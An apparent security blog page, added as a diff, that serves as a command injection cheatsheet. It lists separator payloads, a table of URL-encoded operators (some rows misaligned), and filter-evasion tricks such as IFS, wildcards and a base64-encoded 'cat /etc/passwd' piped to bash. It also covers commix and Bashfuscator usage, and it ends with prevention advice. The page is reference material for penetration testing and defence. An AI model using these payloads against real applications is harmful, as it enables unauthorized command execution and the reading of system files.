@@ -1,0 +1,322 @@
+<!DOCTYPE HTML>
+<html>
+
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="pragma" content="no-cache">
+  <meta http-equiv="cache-control" content="no-cache">
+  <meta http-equiv="expires" content="0">
+  
+    <title>
+      vipa0z</title>
+  <meta name="author" content="vipa0z">
+  
+  <meta name="description" content="Documenting the mechanics of system failure through red team tactics, CTF writeups, malware analysis, and the path into deeper systems hacking.">
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  
+  <meta property="og:site_name" content="vipa0z"/>
+
+  
+    <meta property="og:image" content="favicon.png"/>
+  
+
+  
+    <link rel="alternative" href="/atom.xml" title="vipa0z" type="application/atom+xml">
+  
+  
+    <link href="/favicon.png" rel="icon">
+  
+  
+  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/prism.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/gitbook.css" media="screen" type="text/css">
+  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+
+  <script src="/js/jquery-2.0.3.min.js"></script>
+  <meta name="title" content="vipa0z">
+  <!-- analytics -->
+  
+
+        <!--  favicon/indexing -->
+        <link rel="icon" type="image/png" href="/favicon.ico/favicon-96x96.png" sizes="96x96" />
+        <link rel="icon" type="image/svg+xml" href="/favicon.ico/favicon.svg" />
+        <link rel="shortcut icon" href="/favicon.ico/favicon.ico" />
+        <link rel="apple-touch-icon" sizes="180x180" href="/favicon.ico/apple-touch-icon.png" />
+        <link rel="manifest" href="/favicon.ico/site.webmanifest" />
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+ <body>  
+  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
+	<div class="container">
+		<button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+			<span class="sr-only">Toggle navigation</span>
+			<span class="icon-bar"></span>
+			<span class="icon-bar"></span>
+			<span class="icon-bar"></span>
+		</button>
+		<a class="navbar-brand" href="/">
+			vipa0z
+		</a>
+		<div class="collapse navbar-collapse nav-menu">
+			<ul class="nav navbar-nav">
+				
+					<li>
+						<a href="/index" title="Home">
+							<i class="fa fa-home"></i>Home
+						</a>
+					</li>
+					
+					<li>
+						<a href="/cheatsheets/" title="Cheatsheets_and_Notes">
+							<i class="fa fa-book"></i>Cheatsheets & Notes
+						</a>
+					</li>
+					
+					<li>
+						<a href="/about" title="About me.">
+							<i class="fa fa-user"></i>About Me
+						</a>
+					</li>
+					
+					<li>
+						<a href="/archives" title="All the articles.">
+							<i class="fa fa-archive"></i>Archives
+						</a>
+					</li>
+					
+					<li>
+						<a href="/tags" title="All the tags.">
+							<i class="fa fa-tags"></i>Tags
+						</a>
+					</li>
+					
+						<!-- Theme Toggle -->
+						<li>
+							<a href="#" class="theme-toggle-btn" aria-label="Toggle theme">
+								<i class="fa fa-moon-o"></i> Theme
+							</a>
+						</li>
+			</ul>
+		</div>
+	</div> <!-- container -->
+</nav>
+<div class="clearfix"></div>
+  <div class="container">
+  	<div class="content">
+    	 
+	
+		<div class="page-header">
+			<h1> </h1>
+		</div>
+	
+
+
+
+	<div class="row page">
+		<!-- cols -->
+		
+					<div class="col-md-12">
+						
+
+							<!-- content -->
+							<div class="mypage">
+								
+
+										<h1 id="Command-Injection-Cheatsheet"><a href="#Command-Injection-Cheatsheet" class="headerlink" title="Command Injection Cheatsheet"></a>Command Injection Cheatsheet</h1><h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><p>Command Injection occurs when an application passes unsafe user supplied data (forms, cookies, HTTP headers etc.) to a system shell. In this attack, the attacker-supplied operating system commands are usually executed with the privileges of the vulnerable application.</p>
+<hr>
+<h2 id="Discovery"><a href="#Discovery" class="headerlink" title="Discovery"></a>Discovery</h2><h3 id="Indicators"><a href="#Indicators" class="headerlink" title="Indicators"></a>Indicators</h3><ul>
+<li>Parameters used in system operations (e.g., <code>ping</code>, <code>nslookup</code>, <code>convert</code>).</li>
+<li>Time delays when using sleep commands.</li>
+<li>Output differences when using true&#x2F;false conditions.</li>
+</ul>
+<h3 id="Basic-Testing"><a href="#Basic-Testing" class="headerlink" title="Basic Testing"></a>Basic Testing</h3><p>Inject separators followed by a simple command.</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">; <span class="built_in">whoami</span></span><br><span class="line">| <span class="built_in">whoami</span></span><br><span class="line">|| <span class="built_in">whoami</span></span><br><span class="line">&amp; <span class="built_in">whoami</span></span><br><span class="line">&amp;&amp; <span class="built_in">whoami</span></span><br><span class="line">$(<span class="built_in">whoami</span>)</span><br><span class="line">`<span class="built_in">whoami</span>`</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="Injection-Operators"><a href="#Injection-Operators" class="headerlink" title="Injection Operators"></a>Injection Operators</h2><table>
+<thead>
+<tr>
+<th align="left">Operator</th>
+<th align="left">URL Encoded</th>
+<th align="left">Description</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left"><code>;</code></td>
+<td align="left"><code>%3b</code></td>
+<td align="left">Executes commands sequentially.</td>
+</tr>
+<tr>
+<td align="left"><code>\n</code></td>
+<td align="left"><code>%0a</code></td>
+<td align="left">Newline character, executes commands sequentially.</td>
+</tr>
+<tr>
+<td align="left"><code>&amp;</code></td>
+<td align="left"><code>%26</code></td>
+<td align="left">Background execution (often executes both).</td>
+</tr>
+<tr>
+<td align="left">&#96;</td>
+<td align="left">&#96;</td>
+<td align="left"><code>%7c</code></td>
+</tr>
+<tr>
+<td align="left"><code>&amp;&amp;</code></td>
+<td align="left"><code>%26%26</code></td>
+<td align="left">AND (executes second only if first succeeds).</td>
+</tr>
+<tr>
+<td align="left">&#96;</td>
+<td align="left"></td>
+<td align="left">&#96;</td>
+</tr>
+<tr>
+<td align="left"><code>`</code></td>
+<td align="left"><code>%60%60</code></td>
+<td align="left">Command substitution (Linux).</td>
+</tr>
+<tr>
+<td align="left"><code>$()</code></td>
+<td align="left"><code>%24%28%29</code></td>
+<td align="left">Command substitution (Linux).</td>
+</tr>
+</tbody></table>
+<hr>
+<h2 id="Filter-Evasion"><a href="#Filter-Evasion" class="headerlink" title="Filter Evasion"></a>Filter Evasion</h2><h3 id="Space-Filters"><a href="#Space-Filters" class="headerlink" title="Space Filters"></a>Space Filters</h3><p>If spaces are blocked, use these alternatives:</p>
+<ul>
+<li><strong>Tabs</strong>: <code>%09</code></li>
+<li><strong>IFS Variable</strong>: <code>$&#123;IFS&#125;</code></li>
+<li><strong>Brace Expansion</strong>: <code>&#123;ls,-la&#125;</code></li>
+<li><strong>Redirection</strong>: <code>&lt;</code> or <code>&gt;</code> (e.g., <code>cat&lt;file</code>)</li>
+</ul>
+<p><strong>Examples:</strong></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">127.0.0.1%0a<span class="variable">$&#123;IFS&#125;</span></span><br><span class="line">127.0.0.1%0a&#123;<span class="built_in">ls</span>,-la&#125;</span><br><span class="line"><span class="built_in">cat</span>&lt;/etc/passwd</span><br></pre></td></tr></table></figure>
+
+<h3 id="Character-Filters"><a href="#Character-Filters" class="headerlink" title="Character Filters"></a>Character Filters</h3><p>If specific characters (like <code>/</code> or <code>;</code>) are blocked:</p>
+<ul>
+<li><strong>Environment Variables</strong>: Use substrings of env vars.<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="variable">$&#123;PATH:0:1&#125;</span>       <span class="comment"># Output: /</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$&#123;LS_COLORS:10:1&#125;</span> <span class="comment"># Output: ;</span></span><br></pre></td></tr></table></figure></li>
+<li><strong>Character Shifting</strong>: Generate characters using <code>tr</code>.<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$(<span class="built_in">tr</span> <span class="string">&#x27;!-&#125;&#x27;</span> <span class="string">&#x27;&quot;-~&#x27;</span>&lt;&lt;&lt;[)  <span class="comment"># Output: \</span></span><br></pre></td></tr></table></figure></li>
+</ul>
+<h3 id="Command-Blacklists"><a href="#Command-Blacklists" class="headerlink" title="Command Blacklists"></a>Command Blacklists</h3><p>If specific commands (like <code>whoami</code> or <code>cat</code>) are blocked:</p>
+<ul>
+<li><strong>Quotes</strong>: <code>w&#39;h&#39;o&#39;am&#39;i</code> or <code>w&quot;h&quot;o&quot;am&quot;i</code></li>
+<li><strong>Concatenation</strong>: <code>a=who;b=ami;$a$b</code></li>
+<li><strong>Wildcards</strong>: <code>/bin/c?? /etc/p?????</code></li>
+<li><strong>Reversing</strong>: <code>$(rev&lt;&lt;&lt;&#39;imaohw&#39;)</code></li>
+<li><strong>Base64 Encoding</strong>:<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bash&lt;&lt;&lt;$(<span class="built_in">base64</span> -d&lt;&lt;&lt;<span class="string">Y2F0IC9ldGMvcGFzc3dk)</span></span><br></pre></td></tr></table></figure></li>
+<li><strong>Case Manipulation (Windows)</strong>: <code>WhOaMi</code></li>
+</ul>
+<hr>
+<h2 id="Tools"><a href="#Tools" class="headerlink" title="Tools"></a>Tools</h2><h3 id="Commix"><a href="#Commix" class="headerlink" title="Commix"></a>Commix</h3><p>Automated All-in-One OS Command Injection and Exploitation Tool.</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">commix --url=<span class="string">&quot;http://target.com?param=TEST&quot;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="Obfuscation-Tools"><a href="#Obfuscation-Tools" class="headerlink" title="Obfuscation Tools"></a>Obfuscation Tools</h3><ul>
+<li><strong>Bashfuscator</strong> (Linux):<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./bashfuscator -c <span class="string">&#x27;cat /etc/passwd&#x27;</span> -s 1 -t 1 --no-mangling --layers 1</span><br></pre></td></tr></table></figure></li>
+<li><strong>DOSfuscation</strong> (Windows): Interactive PowerShell tool for obfuscating CMD commands.</li>
+</ul>
+<hr>
+<h2 id="Prevention"><a href="#Prevention" class="headerlink" title="Prevention"></a>Prevention</h2><ol>
+<li><strong>Input Validation</strong>: Whitelist allowed characters (e.g., <code>^[a-zA-Z0-9]+$</code>).</li>
+<li><strong>Avoid System Calls</strong>: Use language-specific libraries instead of <code>system()</code>, <code>exec()</code>, or <code>passthru()</code>.</li>
+<li><strong>Parameterized Commands</strong>: If system calls are necessary, use functions that separate arguments (e.g., <code>execFile</code> in Node.js).</li>
+<li><strong>Least Privilege</strong>: Run the web server as a low-privilege user.</li>
+<li><strong>WAF</strong>: Use a WAF to block common injection patterns.</li>
+</ol>
+
+											<div class="article-footer-copyright">
+
+</div>
+
+							</div>
+
+							
+									
+											<div>
+												<center>
+
+													<div class="pagination">
+
+    
+</div>
+
+
+												</center>
+											</div>
+
+											<!-- comment -->
+											<!--
+-->
+											
+													
+															
+					</div> <!-- col-md-9/col-md-12 -->
+
+
+
+					
+
+
+			</div><!-- row -->
+
+			<!--
+ -->
+
+
+			<!-- Fixed TOC Container for hexo-toc.js -->
+
+	</div>
+  </div>
+  <div class="container-narrow">
+  <footer> <p>
+  
+  &copy; 2025 vipa0z's Blog
+  
+</p>
+ </footer>
+</div> <!-- container-narrow -->
+  
+
+
+  <a id="gotop" href="#">
+  <span>⬆︎TOP</span>
+</a>
+
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+<script src="/js/bootstrap.min.js"></script>
+<script src="/js/main.js"></script>
+<script src="/js/search.js"></script>
+<script src="/js/hexo-toc.js"></script>
+
+
+  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+  <script src="/fancybox/jquery.fancybox.pack.js"></script>
+  <script type="text/javascript">
+    (function ($) {
+      $('.fancybox').fancybox();
+    })(jQuery);
+  </script>
+  
+
+    
+      <script type="text/javascript">
+        var search_path = "search.xml";
+        if (search_path.length == 0) {
+          search_path = "search.xml";
+        }
+        var path = "/" + search_path;
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      </script>
+      
+  <script src="/js/theme-toggle.js"></script>
+</body>
+   </html>
